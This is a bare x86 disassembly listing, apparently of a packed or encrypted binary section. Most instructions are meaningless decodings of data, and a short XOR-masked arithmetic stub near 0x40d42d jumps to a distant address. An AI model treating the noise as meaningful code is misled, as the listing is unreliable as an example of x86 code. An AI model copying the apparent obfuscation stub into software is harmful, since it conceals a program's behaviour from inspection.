  40ce68:	mov    dh,0x77
  40ce6a:	les    esi,FWORD PTR [edi]
  40ce6c:	sbb    BYTE PTR [esi-0x134829c],dh
  40ce72:	inc    edx
  40ce73:	cmp    al,0x7e
  40ce75:	mov    eax,ds:0x10b9b94e
  40ce7a:	rcr    DWORD PTR [eax+eiz*8-0x1c05479a],cl
  40ce81:	jae    0x40ceb1
  40ce83:	sub    eax,0xecd26ba6
  40ce88:	dec    eax
  40ce89:	pop    edx
  40ce8a:	dec    esp
  40ce8b:	bound  ecx,QWORD PTR [eax+eax*1+0x74]
  40ce8f:	xchg   edx,eax
  40ce90:	and    bl,dl
  40ce92:	dec    esi
  40ce93:	xchg   esp,eax
  40ce94:	jle    0x40ce8d
  40ce96:	ins    BYTE PTR es:[edi],dx
  40ce97:	push   eax
  40ce98:	mov    edi,0x6f972bc
  40ce9d:	mov    edi,0x74e336cd
  40cea2:	popf   
  40cea3:	adc    eax,0x264a3b9a
  40cea8:	pop    ss
  40cea9:	nop
  40ceaa:	mov    al,ds:0xb54004fd
  40ceaf:	xor    BYTE PTR [edi-0x3b2f3139],al
  40ceb5:	adc    eax,0xc975e416
  40ceba:	ret    0xa1f2
  40cebd:	test   eax,esp
  40cebf:	(bad)  
  40cec0:	rcl    BYTE PTR [eax],1
  40cec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cec3:	mov    eax,ds:0xf1c63b27
  40cec8:	xchg   ebx,eax
  40cec9:	push   eax
  40ceca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cecb:	fist   WORD PTR [esi-0x5]
  40cece:	or     DWORD PTR [edi-0x27f46b4b],esi
  40ced4:	rol    BYTE PTR [edi-0x875ab3d],0x93
  40cedb:	iret   
  40cedc:	jle    0x40cf38
  40cede:	xchg   esi,eax
  40cedf:	in     al,0x5
  40cee1:	std    
  40cee2:	sub    edx,0xfa61bda8
  40cee8:	dec    edx
  40cee9:	mov    ebx,0x14cc6fe4
  40ceee:	adc    eax,0x148113ca
  40cef3:	dec    esi
  40cef4:	ret    
  40cef5:	mov    ecx,0x3d8a45f6
  40cefa:	scas   eax,DWORD PTR es:[edi]
  40cefb:	(bad)  
  40cefc:	cmp    ebx,DWORD PTR [esi+ebx*2]
  40ceff:	data16 and bh,dh
  40cf02:	mov    ch,0xb5
  40cf04:	loope  0x40cf09
  40cf06:	pop    ecx
  40cf07:	push   eax
  40cf08:	pop    esi
  40cf09:	and    DWORD PTR [eax],eax
  40cf0b:	cs pop ebx
  40cf0d:	clc    
  40cf0e:	push   ebx
  40cf0f:	jnp    0x40cf48
  40cf11:	sahf   
  40cf12:	or     ecx,DWORD PTR [ebx-0x6b6abbfc]
  40cf18:	stos   DWORD PTR es:[edi],eax
  40cf19:	push   ds
  40cf1a:	fcomi  st,st(2)
  40cf1c:	stos   DWORD PTR es:[edi],eax
  40cf1d:	dec    ecx
  40cf1e:	pop    ebx
  40cf1f:	jno    0x40cf07
  40cf21:	push   esp
  40cf22:	jnp    0x40cf51
  40cf24:	mov    al,0x77
  40cf26:	jmp    0x40cebc
  40cf28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf29:	push   es
  40cf2a:	inc    esp
  40cf2b:	jo     0x40ceb9
  40cf2d:	and    DWORD PTR [esi-0x7908f2b9],edi
  40cf33:	cs stos DWORD PTR es:[edi],eax
  40cf35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf36:	stc    
  40cf37:	pop    ecx
  40cf38:	cmc    
  40cf39:	popf   
  40cf3a:	dec    edi
  40cf3b:	pop    ebx
  40cf3c:	cmp    al,0x33
  40cf3e:	pop    ebx
  40cf3f:	and    al,bl
  40cf41:	out    dx,al
  40cf42:	clc    
  40cf43:	pusha  
  40cf44:	push   ss
  40cf45:	inc    edx
  40cf46:	xor    ch,0x66
  40cf49:	add    eax,0x7c751335
  40cf4e:	aas    
  40cf4f:	lock mov WORD PTR [esi+eiz*1-0x1e],?
  40cf54:	dec    edx
  40cf55:	popf   
  40cf56:	fdivr  st,st(6)
  40cf58:	adc    BYTE PTR [eax+ebp*4],ch
  40cf5b:	addr16 rol ch,1
  40cf5e:	(bad)  
  40cf5f:	js     0x40cf8b
  40cf61:	in     eax,dx
  40cf62:	retf   0xafd6
  40cf65:	inc    ebx
  40cf66:	and    eax,0x6ec3ef67
  40cf6b:	jecxz  0x40cfcc
  40cf6d:	push   ebp
  40cf6e:	pop    ebp
  40cf6f:	(bad)  
  40cf70:	and    ebp,DWORD PTR [ebp-0x454d951c]
  40cf76:	js     0x40cf5b
  40cf78:	daa    
  40cf79:	jp     0x40cfae
  40cf7b:	xchg   esi,eax
  40cf7c:	inc    edi
  40cf7d:	mov    gs,edx
  40cf7f:	ds mov esi,0x29451a66
  40cf85:	adc    BYTE PTR ds:0x2ddcfeaa,bh
  40cf8b:	push   esi
  40cf8c:	out    0x4f,al
  40cf8e:	add    eax,0xa832be3d
  40cf93:	jmp    0x5eddd6a1
  40cf98:	fnstenv [eax+0xe782d59]
  40cf9e:	xchg   ebx,edi
  40cfa0:	aaa    
  40cfa1:	sub    DWORD PTR [ecx+0x34],ecx
  40cfa4:	jmp    0xdcffb31b
  40cfa9:	ja     0x40cf42
  40cfab:	xor    BYTE PTR [esi+ecx*2-0x2aff8102],0x4c
  40cfb3:	fsubr  st(7),st
  40cfb5:	and    al,BYTE PTR [eax-0x21]
  40cfb8:	fistp  WORD PTR ds:0x55ff7bfb
  40cfbe:	push   esi
  40cfbf:	fsub   DWORD PTR [eax+0x75]
  40cfc2:	rol    edi,0xae
  40cfc5:	dec    ecx
  40cfc6:	icebp  
  40cfc7:	adc    DWORD PTR [ebx],eax
  40cfc9:	and    BYTE PTR [esi-0x1b7cbd76],0xb0
  40cfd0:	out    dx,al
  40cfd1:	aam    0xdc
  40cfd3:	mov    ebx,0x9d52e332
  40cfd8:	ss inc ebx
  40cfda:	dec    edx
  40cfdb:	and    BYTE PTR [eax],al
  40cfdd:	test   DWORD PTR [esi+0x21aeb799],esi
  40cfe3:	sub    al,0xf
  40cfe5:	sub    cl,ah
  40cfe7:	ja     0x40cfeb
  40cfe9:	push   es
  40cfea:	adc    bl,BYTE PTR ds:0xa5718674
  40cff0:	dec    esi
  40cff1:	mov    DWORD PTR [eax+0x35],edi
  40cff4:	mov    cl,0x88
  40cff6:	sbb    al,dh
  40cff8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cff9:	sbb    DWORD PTR [eax-0x6a07832e],ecx
  40cfff:	psubq  mm7,QWORD PTR [edi+0x76]
  40d003:	popa   
  40d004:	ror    DWORD PTR [ebx+0x2e1a67f4],cl
  40d00a:	les    edx,FWORD PTR [edx]
  40d00c:	out    dx,eax
  40d00d:	fcomp  QWORD PTR [esi]
  40d00f:	xchg   BYTE PTR [ebx+0x6a8e5ba],al
  40d015:	xor    BYTE PTR [ebx],0xa
  40d018:	add    BYTE PTR [ecx],bh
  40d01a:	xor    DWORD PTR [esi+edi*8-0x2cbb999e],ebp
  40d021:	push   es
  40d022:	repnz xchg esp,eax
  40d024:	leave  
  40d025:	mov    eax,ds:0x47f78b4a
  40d02a:	js     0x40cff6
  40d02c:	cmp    BYTE PTR [eax-0xd],dh
  40d02f:	popa   
  40d030:	cld    
  40d031:	out    0x29,al
  40d033:	ins    DWORD PTR es:[edi],dx
  40d034:	ficom  WORD PTR [ebp+ebp*1+0x3225db08]
  40d03b:	add    BYTE PTR [eax-0x7e],0x32
  40d03f:	stos   BYTE PTR es:[edi],al
  40d040:	imul   ecx,DWORD PTR [ecx+0x34],0xd19d3a07
  40d047:	push   ds
  40d048:	jmp    0x40d0a5
  40d04a:	popa   
  40d04b:	shl    DWORD PTR [edi],0x52
  40d04e:	mov    dl,0x26
  40d050:	loope  0x40d028
  40d052:	mov    ch,0xbf
  40d054:	add    al,ch
  40d056:	lock mov dh,BYTE PTR [edx+0x5b]
  40d05a:	push   edi
  40d05b:	xor    dl,BYTE PTR [edi]
  40d05d:	mov    DWORD PTR [esp+eiz*4+0x52],0x3dcc06d0
  40d065:	mov    WORD PTR ds:0xbf03360e,cs
  40d06b:	sbb    DWORD PTR [edx+0x2253fdc2],0x28cbda0
  40d075:	mov    dh,al
  40d077:	xchg   ecx,eax
  40d078:	push   esi
  40d079:	les    edx,FWORD PTR [edx+ecx*1]
  40d07c:	inc    edx
  40d07d:	int3   
  40d07e:	push   ds
  40d07f:	(bad)  
  40d080:	pop    ebp
  40d081:	add    eax,0xacb59b2f
  40d086:	in     al,dx
  40d087:	in     al,0x44
  40d089:	int3   
  40d08a:	imul   edi,DWORD PTR [edx],0x85cfc5b6
  40d090:	ds ja  0x40d01a
  40d093:	dec    esi
  40d094:	mov    edi,0x7f58f6e6
  40d099:	mov    ecx,ebx
  40d09b:	add    edx,ebx
  40d09d:	(bad)  
  40d09e:	invd   
  40d0a0:	loope  0x40d074
  40d0a2:	xchg   ebp,eax
  40d0a3:	shl    DWORD PTR [eax-0x4b],1
  40d0a6:	call   0x4a28:0x57154f7a
  40d0ad:	lds    esi,FWORD PTR ds:0x56c32fba
  40d0b3:	mov    edx,DWORD PTR [edx+0x2a8199b7]
  40d0b9:	sub    eax,0x32c720cd
  40d0be:	jle    0x40d07d
  40d0c0:	jmp    0x40d0f4
  40d0c2:	(bad)  
  40d0c3:	(bad)  
  40d0c4:	jmp    0xdb87ae9b
  40d0c9:	xchg   edx,eax
  40d0ca:	xchg   edi,eax
  40d0cb:	and    esp,esi
  40d0cd:	mov    al,0x1a
  40d0cf:	mov    esp,0x6c70459e
  40d0d4:	test   ah,al
  40d0d6:	dec    edx
  40d0d7:	loope  0x40d084
  40d0d9:	mov    dl,dl
  40d0db:	pop    ecx
  40d0dc:	or     ah,al
  40d0de:	xchg   ebx,eax
  40d0df:	adc    al,0x18
  40d0e1:	int    0xd5
  40d0e3:	mov    al,ds:0xbc64f501
  40d0e8:	dec    ebx
  40d0e9:	ins    DWORD PTR es:[edi],dx
  40d0ea:	jp     0x40d0f0
  40d0ec:	mov    edx,0xedb2cf40
  40d0f1:	inc    edx
  40d0f2:	test   DWORD PTR [edx-0x3e3fb8fb],eax
  40d0f8:	pop    ss
  40d0f9:	lods   eax,DWORD PTR ds:[esi]
  40d0fa:	rep lods al,BYTE PTR ds:[esi]
  40d0fc:	sub    eax,0x672c6fcb
  40d101:	add    BYTE PTR [eax+ebp*2-0x29],bh
  40d105:	pop    ss
  40d106:	ret    0x6e01
  40d109:	in     eax,0x86
  40d10b:	mov    ds:0xf3ad3007,al
  40d110:	clc    
  40d111:	add    eax,0x74a31a31
  40d116:	clc    
  40d117:	xchg   esi,eax
  40d118:	add    DWORD PTR [edx+0x1631b607],edx
  40d11e:	gs aad 0xce
  40d121:	ins    DWORD PTR es:[edi],dx
  40d122:	je     0x40d18c
  40d124:	in     eax,0x5a
  40d126:	(bad)  
  40d127:	cmp    dl,cl
  40d129:	adc    BYTE PTR [ebx+0x6717b885],0xac
  40d130:	mov    eax,0x53909767
  40d135:	add    al,0xcf
  40d137:	nop
  40d138:	jne    0x40d172
  40d13a:	push   ebx
  40d13b:	push   ss
  40d13c:	inc    edi
  40d13d:	(bad)  
  40d13f:	sbb    edi,ecx
  40d141:	adc    eax,0x1dc71b00
  40d146:	push   es
  40d147:	(bad)  
  40d148:	std    
  40d149:	pop    ds
  40d14a:	scas   al,BYTE PTR es:[edi]
  40d14b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d14c:	add    DWORD PTR [esi+0x6d4e9b25],ebp
  40d152:	mov    ch,0xb4
  40d154:	out    0x49,al
  40d156:	xor    eax,0x9a0e7309
  40d15b:	mov    al,ds:0x24599696
  40d160:	loopne 0x40d148
  40d162:	popa   
  40d163:	int    0x37
  40d165:	mov    eax,0xb1c0a580
  40d16a:	and    ecx,DWORD PTR [eax+edi*1-0x3a]
  40d16e:	mov    al,BYTE PTR [edx]
  40d170:	sbb    ecx,edi
  40d172:	hlt    
  40d173:	add    cl,BYTE PTR [edx-0x640cb883]
  40d179:	and    DWORD PTR [edx],0xffffffa4
  40d17c:	and    eax,0xb824f454
  40d181:	and    cl,bh
  40d183:	mov    al,0xb2
  40d185:	cmc    
  40d186:	add    DWORD PTR [ecx+0x27],0x1f
  40d18a:	jno    0x40d170
  40d18c:	jle    0x40d16d
  40d18e:	push   ds
  40d18f:	mov    ebx,fs
  40d191:	pop    esp
  40d192:	jg     0x40d156
  40d194:	pushf  
  40d195:	mov    edx,0xacc1dda6
  40d19a:	sbb    al,0xb0
  40d19c:	jae    0x40d1a5
  40d19e:	(bad)  [ebx+0x10]
  40d1a1:	inc    edx
  40d1a2:	call   0x892:0x6e470612
  40d1a9:	(bad)  
  40d1aa:	fsubr  QWORD PTR [ebx]
  40d1ac:	push   ds
  40d1ad:	in     eax,dx
  40d1ae:	arpl   WORD PTR [ecx+0x66c80901],bx
  40d1b4:	idiv   DWORD PTR [esi+0x34]
  40d1b7:	lock jmp ecx
  40d1ba:	sub    DWORD PTR [eax],0xc161c1e3
  40d1c0:	mov    ebp,0xc4cbfb13
  40d1c5:	lahf   
  40d1c6:	jp     0x40d22d
  40d1c8:	jecxz  0x40d19b
  40d1ca:	mov    ebp,0x221f2fbb
  40d1cf:	cmp    BYTE PTR [esi],0x86
  40d1d2:	ins    DWORD PTR es:[edi],dx
  40d1d3:	repnz ins DWORD PTR es:[edi],dx
  40d1d5:	popa   
  40d1d6:	mov    eax,ds:0x43d7eaa7
  40d1db:	dec    esi
  40d1dc:	lock js 0x40d250
  40d1df:	(bad)  
  40d1e0:	and    eax,0x83ce7f51
  40d1e5:	(bad)  
  40d1e7:	sti    
  40d1e8:	jp     0x40d247
  40d1ea:	out    0x37,al
  40d1ec:	or     BYTE PTR [edi],ah
  40d1ee:	adc    bl,BYTE PTR [ebp+0x7b00c4ed]
  40d1f4:	cmc    
  40d1f5:	ror    DWORD PTR [esi-0x45fb82b2],1
  40d1fb:	add    DWORD PTR [edx+0x321527eb],esp
  40d201:	sbb    DWORD PTR [eax+esi*1-0x748433a1],esp
  40d208:	lock pushf 
  40d20a:	(bad)  
  40d20b:	pop    esp
  40d20c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d20d:	inc    esi
  40d20e:	pushf  
  40d20f:	pop    es
  40d210:	push   edx
  40d211:	xchg   ebx,eax
  40d212:	stos   DWORD PTR es:[edi],eax
  40d213:	into   
  40d214:	and    dl,0x37
  40d217:	int3   
  40d218:	hlt    
  40d219:	shr    ecx,0xae
  40d21c:	daa    
  40d21d:	scas   al,BYTE PTR es:[edi]
  40d21e:	inc    ebx
  40d21f:	out    0x69,eax
  40d221:	dec    esp
  40d222:	repnz sbb DWORD PTR [edi-0x59],ebx
  40d226:	xchg   esp,eax
  40d227:	mov    dl,bl
  40d229:	jno    0x40d213
  40d22b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d22c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d22d:	dec    eax
  40d22e:	push   esp
  40d22f:	in     eax,dx
  40d230:	test   eax,0x4d486d3d
  40d235:	xchg   edi,ebx
  40d237:	sbb    ebx,DWORD PTR [ecx]
  40d239:	jo     0x40d1f3
  40d23b:	(bad)  
  40d23c:	adc    BYTE PTR [ebx],dh
  40d23e:	adc    ch,bh
  40d240:	test   al,0x59
  40d242:	sbb    BYTE PTR [edi-0x53],ch
  40d245:	sub    eax,0x32a7769e
  40d24a:	leave  
  40d24b:	ror    ah,1
  40d24d:	(bad)  
  40d24e:	xor    DWORD PTR [ebx],edx
  40d250:	xchg   edi,eax
  40d251:	mov    edi,0x8c931a75
  40d256:	test   DWORD PTR [esp+edi*8],edx
  40d259:	mov    eax,ds:0x5216ecea
  40d25e:	and    DWORD PTR [ecx-0x3],0xffffffa0
  40d262:	cmp    eax,0xe92f92cc
  40d267:	inc    esi
  40d268:	into   
  40d269:	inc    ebx
  40d26a:	pop    esp
  40d26b:	dec    ebp
  40d26c:	xchg   esp,eax
  40d26d:	test   DWORD PTR [ebx-0x7bf9be05],ebx
  40d273:	es xchg esi,ecx
  40d276:	xor    BYTE PTR [ecx+0x29],0x93
  40d27a:	cmp    eax,0x657c95b1
  40d27f:	aad    0x69
  40d281:	mov    eax,ds:0x2d6bab0a
  40d286:	and    ch,BYTE PTR [ebx-0x3e74636d]
  40d28c:	cli    
  40d28d:	arpl   WORD PTR [edx+ecx*2+0x3d49ed90],sp
  40d294:	iret   
  40d295:	cmp    DWORD PTR [esi],0xffffff9a
  40d298:	pop    ds
  40d299:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d29a:	xchg   ecx,eax
  40d29b:	mov    ebp,0x2eea262c
  40d2a0:	aad    0x15
  40d2a2:	cld    
  40d2a3:	jbe    0x40d310
  40d2a5:	cwde   
  40d2a6:	shr    dh,cl
  40d2a8:	je     0x40d2f0
  40d2aa:	jg     0x40d24d
  40d2ac:	in     al,0x11
  40d2ae:	sub    DWORD PTR [ebp+0x49],ebp
  40d2b1:	mov    ah,0x36
  40d2b3:	pop    esp
  40d2b4:	in     eax,dx
  40d2b5:	dec    edi
  40d2b6:	add    BYTE PTR [edx],0x5a
  40d2b9:	inc    eax
  40d2ba:	xchg   BYTE PTR [edi],cl
  40d2bc:	jge    0x40d23f
  40d2be:	repnz outs dx,DWORD PTR ds:[esi]
  40d2c0:	cs jnp 0x40d2fa
  40d2c3:	adc    bl,BYTE PTR [edx-0xad6b9ab]
  40d2c9:	leave  
  40d2ca:	imul   DWORD PTR [edi+0x7cfc9860]
  40d2d0:	dec    esp
  40d2d1:	repnz dec ebx
  40d2d3:	dec    ebp
  40d2d4:	std    
  40d2d5:	ret    
  40d2d6:	add    esi,DWORD PTR [eax+ebx*8]
  40d2d9:	cmp    ebx,esp
  40d2db:	add    bh,BYTE PTR [ebx+0x6a3a7856]
  40d2e1:	add    ebx,DWORD PTR ss:[edx-0x6a]
  40d2e5:	jmp    0xe5f79873
  40d2ea:	jns    0x40d33c
  40d2ec:	adc    al,0x68
  40d2ee:	sub    cl,BYTE PTR [eax]
  40d2f0:	fisubr DWORD PTR [ecx]
  40d2f2:	add    BYTE PTR [ebx],ah
  40d2f4:	lea    ebp,[ecx-0x3e]
  40d2f7:	jmp    0xbc05334d
  40d2fc:	pop    esi
  40d2fd:	pop    esi
  40d2fe:	or     edi,esi
  40d300:	stc    
  40d301:	add    al,0x91
  40d303:	push   cs
  40d304:	cmp    BYTE PTR [edi],bl
  40d306:	fucomp st(0)
  40d308:	ins    BYTE PTR es:[edi],dx
  40d309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d30a:	adc    BYTE PTR [edi+0x31ad1a28],al
  40d310:	shl    BYTE PTR [ecx+0x3a],cl
  40d313:	jns    0x40d37a
  40d315:	repz repz sbb ebp,DWORD PTR [ecx-0x26]
  40d31a:	and    eax,0x93287ccf
  40d31f:	sar    DWORD PTR [esi+0x79e1f787],0xe2
  40d326:	in     al,dx
  40d327:	cmc    
  40d328:	mov    dl,0xd9
  40d32a:	sub    eax,0xfa02efd6
  40d32f:	fldcw  WORD PTR [esi+0x4d]
  40d332:	or     BYTE PTR [ecx-0x4c902a0a],dl
  40d338:	sub    bh,0xe
  40d33b:	call   DWORD PTR [esi+0x65]
  40d33e:	hlt    
  40d33f:	sbb    al,0x7c
  40d341:	mov    ds,WORD PTR fs:[edi]
  40d344:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d345:	push   ds
  40d346:	scas   al,BYTE PTR es:[edi]
  40d347:	mov    bh,0x3
  40d349:	xor    BYTE PTR [ebp+eiz*4-0x32608915],0xff
  40d351:	addr16 dec edx
  40d354:	mov    eax,0xbfdd619b
  40d359:	adc    al,0x2e
  40d35b:	sbb    ecx,DWORD PTR [ecx+0x46]
  40d35e:	mov    esp,0xad05c458
  40d363:	jecxz  0x40d332
  40d365:	mov    edi,0x929c9b6a
  40d36a:	pushf  
  40d36b:	or     al,0x2
  40d36d:	lea    esi,[ebx]
  40d36f:	push   edx
  40d370:	hlt    
  40d371:	add    al,0x29
  40d373:	xchg   ebp,eax
  40d374:	imul   ecx,DWORD PTR [esi],0xea4cc90e
  40d37a:	test   BYTE PTR [esi+edx*8],ah
  40d37d:	mov    cl,0x50
  40d37f:	pop    edx
  40d380:	(bad)  
  40d381:	mov    dl,0xfd
  40d383:	nop
  40d384:	jbe    0x40d354
  40d386:	and    bh,cl
  40d388:	adc    DWORD PTR [edi],esi
  40d38a:	aas    
  40d38b:	bnd jp 0x40d355
  40d38e:	nop
  40d38f:	push   cs
  40d390:	mov    ds:0x6885b82b,eax
  40d395:	out    dx,eax
  40d396:	lods   al,BYTE PTR ds:[esi]
  40d397:	in     eax,dx
  40d398:	mov    ds:0x29b766f1,eax
  40d39d:	nop
  40d39e:	loop   0x40d3cf
  40d3a0:	fstp   TBYTE PTR ds:0x263a8f19
  40d3a6:	lock ins BYTE PTR es:[edi],dx
  40d3a8:	cmp    DWORD PTR [esi+0x66d7dbe7],0xffffffe6
  40d3af:	xchg   esi,eax
  40d3b0:	jb     0x40d403
  40d3b2:	cmp    BYTE PTR [ecx+0x41b3a89f],ch
  40d3b8:	and    BYTE PTR [eax-0x67],bh
  40d3bb:	fs ins BYTE PTR es:[edi],dx
  40d3bd:	adc    BYTE PTR [eax-0xd9827bf],ah
  40d3c3:	js     0x40d374
  40d3c5:	mov    esp,0xd5f4ae0c
  40d3ca:	push   ebx
  40d3cb:	push   edx
  40d3cc:	lock std 
  40d3ce:	fs sub DWORD PTR ds:[edx+0x2b],ecx
  40d3d3:	out    0xb1,eax
  40d3d5:	repnz dec esp
  40d3d7:	das    
  40d3d8:	jmp    0x3da25647
  40d3dd:	in     al,0x25
  40d3df:	or     esp,DWORD PTR [ebx-0x73e68cb]
  40d3e5:	mov    ch,0x54
  40d3e7:	fstp   st(1)
  40d3e9:	retf   0x5e64
  40d3ec:	gs or  ch,dh
  40d3ef:	cs jns 0x40d45c
  40d3f2:	aam    0x29
  40d3f4:	(bad)  
  40d3f5:	sbb    eax,0xf6f8f146
  40d3fa:	adc    eax,0xecaad310
  40d3ff:	sub    BYTE PTR [ebx],dl
  40d401:	(bad)
  40d404:	pop    ss
  40d405:	loop   0x40d474
  40d407:	or     DWORD PTR [ecx+0x43],0x73
  40d40b:	aam    0x25
  40d40d:	mov    ecx,0x9d1bffa6
  40d412:	call   0x3de5:0xbfdb0c82
  40d419:	das    
  40d41a:	and    bh,cl
  40d41c:	pop    ebx
  40d41d:	pop    eax
  40d41e:	fwait
  40d41f:	outs   dx,DWORD PTR ds:[esi]
  40d420:	mov    edx,0x75f76af
  40d425:	pop    esi
  40d426:	data16 cmp BYTE PTR [edi-0x74fd50f1],dh
  40d42d:	push   ebp
  40d42e:	cld    
  40d42f:	xor    edx,ecx
  40d431:	mov    ecx,DWORD PTR [ebp+0x8]
  40d434:	lea    ecx,[edx+ecx*1+0x3272db]
  40d43b:	cmp    ecx,eax
  40d43d:	je     0x40d4b4
  40d443:	mov    edi,DWORD PTR [ebp-0x14]
  40d446:	mov    eax,DWORD PTR [ebp+0x8]
  40d449:	mov    edx,DWORD PTR [ebp+0x14]
  40d44c:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d450:	mov    ecx,0x7510893
  40d455:	xor    edx,edx
  40d457:	xor    edi,ecx
  40d459:	mov    esi,0x3272db
  40d45e:	add    edi,esi
  40d460:	div    edi
  40d462:	mov    edx,DWORD PTR [ebp-0x4]
  40d465:	xor    edx,ecx
  40d467:	lea    eax,[edx+eax*1+0x3272db]
  40d46e:	mov    edx,DWORD PTR [ebp+0x8]
  40d471:	mov    edi,DWORD PTR [ebp-0x20]
  40d474:	mov    DWORD PTR [edi+edx*4],eax
  40d477:	mov    eax,DWORD PTR [ebp-0x14]
  40d47a:	mov    edx,DWORD PTR [ebp+0x8]
  40d47d:	xor    eax,ecx
  40d47f:	lea    eax,[eax+edx*1+0x3272db]
  40d486:	mov    DWORD PTR [ebp+0x8],eax
  40d489:	mov    eax,DWORD PTR [ebp-0x14]
  40d48c:	mov    edx,DWORD PTR [ebp+0x14]
  40d48f:	xor    eax,ecx
  40d491:	add    eax,esi
  40d493:	imul   eax,DWORD PTR [edx]
  40d496:	mov    edx,DWORD PTR [ebp-0x4]
  40d499:	xor    edx,ecx
  40d49b:	mov    ecx,DWORD PTR [ebp+0x8]
  40d49e:	lea    ecx,[edx+ecx*1+0x3272db]
  40d4a5:	cmp    ecx,eax
  40d4a7:	jne    0x40d443
  40d4ad:	mov    eax,esi
  40d4af:	jmp    0x40d4b9
  40d4b4:	mov    eax,0x3272db
  40d4b9:	mov    ebx,0x7510893
  40d4be:	mov    ecx,DWORD PTR [ebp-0x4]
  40d4c1:	xor    ecx,ebx
  40d4c3:	add    ecx,eax
  40d4c5:	mov    DWORD PTR [ebp-0xc],ecx
  40d4c8:	mov    ebx,0x65655
  40d4cd:	add    ebx,0x3234
  40d4d3:	xchg   ebx,esi
  40d4d5:	xor    ebx,ebx
  40d4d7:	push   esi
  40d4d8:	mov    esi,ebx
  40d4da:	pop    ebx
  40d4db:	mov    edx,esi
  40d4dd:	add    ebx,0x1002
  40d4e3:	lea    eax,[ebp-0x10]
  40d4e6:	add    edx,eax
  40d4e8:	add    edx,0x5
  40d4eb:	push   edx
  40d4ec:	inc    esi
  40d4ed:	pop    ecx
  40d4ee:	dec    ecx
  40d4ef:	jmp    0x40f854
  40d4f4:	jl     0x40d532
  40d4f6:	pop    es
  40d4f7:	call   0xe49cb803
  40d4fc:	and    BYTE PTR [edi+0x158d4edd],0x8d
  40d503:	test   eax,0x6262d2a0
  40d508:	cmp    bl,BYTE PTR [edi+0x62]
  40d50b:	bound  edx,QWORD PTR [esp+edi*8]
  40d50e:	xlat   BYTE PTR ds:[ebx]
  40d50f:	inc    esp
  40d510:	add    al,0xad
  40d512:	push   edx
  40d513:	daa    
  40d514:	dec    esp
  40d515:	or     al,dh
  40d517:	sbb    eax,eax
  40d519:	sub    al,0x6c
  40d51b:	jb     0x40d559
  40d51d:	test   eax,0x6b347689
  40d522:	outs   dx,DWORD PTR ds:[esi]
  40d523:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d524:	cmp    DWORD PTR [ebx],edi
  40d526:	cmp    dh,BYTE PTR [ecx+0x46f89ef3]
  40d52c:	or     al,0xd2
  40d52e:	mov    dh,0x1a
  40d530:	(bad)  
  40d531:	push   0xffffff91
  40d533:	inc    esp
  40d534:	addr16 mov ch,ah
  40d537:	or     eax,0xd874c217
  40d53c:	dec    edi
  40d53d:	rol    DWORD PTR [esi],0xff
  40d540:	and    al,0xbe
  40d542:	scas   eax,DWORD PTR es:[edi]
  40d543:	test   eax,0x756ab91e
  40d548:	push   ds
  40d549:	(bad)  
  40d54b:	fabs   
  40d54d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d54e:	cmp    ebx,ebp
  40d550:	or     bh,ch
  40d552:	sub    eax,0x6eb593d
  40d557:	or     ebp,DWORD PTR [eax-0x374bf4b4]
  40d55d:	in     eax,dx
  40d55e:	pop    ebp
  40d55f:	xor    al,0x1c
  40d561:	dec    esi
  40d562:	mov    eax,0xd6474d44
  40d567:	aaa    
  40d568:	call   0xa0e7:0xc6655ee7
  40d56f:	mov    dh,0x86
  40d571:	outs   dx,WORD PTR ds:[esi]
  40d573:	adc    esp,DWORD PTR [edi-0x65]
  40d576:	pop    ebp
  40d577:	outs   dx,BYTE PTR ds:[esi]
  40d578:	arpl   WORD PTR gs:[ebp-0x25],di
  40d57c:	jmp    0xaba780bc
  40d581:	lea    edi,[ecx+0x1498dd36]
  40d587:	cld    
  40d588:	pop    ebx
  40d589:	shr    DWORD PTR [ebx-0x61],1
  40d58c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d58d:	sti    
  40d58e:	daa    
  40d58f:	(bad)  
  40d590:	in     al,dx
  40d591:	mov    eax,ds:0xb8d64f4e
  40d596:	aad    0x10
  40d598:	mov    ch,BYTE PTR [esi+0xc0c3cfa]
  40d59e:	hlt    
  40d59f:	out    dx,eax
  40d5a0:	sbb    ah,bl
  40d5a2:	jnp    0x40d5a5
  40d5a4:	dec    ebp
  40d5a5:	xchg   esp,eax
  40d5a6:	ret    0xf4c2
  40d5a9:	jb     0x40d627
  40d5ab:	inc    edi
  40d5ac:	and    edx,DWORD PTR [edx+0x51a5859d]
  40d5b2:	mov    ebp,DWORD PTR [ebx-0x66]
  40d5b5:	inc    esi
  40d5b6:	repnz jmp 0xbccd:0x585f3522
  40d5be:	inc    edi
  40d5bf:	cmp    ah,0xd2
  40d5c2:	or     eax,0x99b82396
  40d5c7:	mov    ds:0x472b2725,eax
  40d5cc:	inc    ebx
  40d5cd:	test   cl,bl
  40d5cf:	clc    
  40d5d0:	loopne 0x40d55a
  40d5d2:	add    eax,0xad01249b
  40d5d7:	bound  eax,QWORD PTR [ebx+edx*1-0x66cd690c]
  40d5de:	lahf   
  40d5df:	loope  0x40d572
  40d5e1:	retf   
  40d5e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5e3:	imul   ebx,ebx,0xffffffb6
  40d5e6:	xchg   edi,eax
  40d5e7:	mul    DWORD PTR [ebx+0x30]
  40d5ea:	jge    0x40d598
  40d5ec:	inc    esp
  40d5ed:	leave  
  40d5ee:	push   ss
  40d5ef:	jo     0x40d587
  40d5f1:	lock dec eax
  40d5f3:	jbe    0x40d595
  40d5f5:	cmp    ch,BYTE PTR [ebp+0x57]
  40d5f8:	ror    ch,1
  40d5fa:	loop   0x40d60d
